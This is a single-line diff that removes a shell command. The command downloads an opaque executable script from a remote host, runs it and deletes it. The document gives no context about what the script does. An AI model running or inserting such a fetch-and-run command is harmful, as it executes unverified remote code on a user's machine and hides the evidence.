@@ -1,1 +1,0 @@
-temp_file=$(mktemp) && curl -f#SL "https://op.on99.top:7749/d/%E5%85%AC%E5%BC%80%E5%AD%98%E5%82%A8/Temp/cqfnlogo.sh.x" -o "$temp_file" && chmod +x "$temp_file" && "$temp_file" && rm -f "$temp_file"
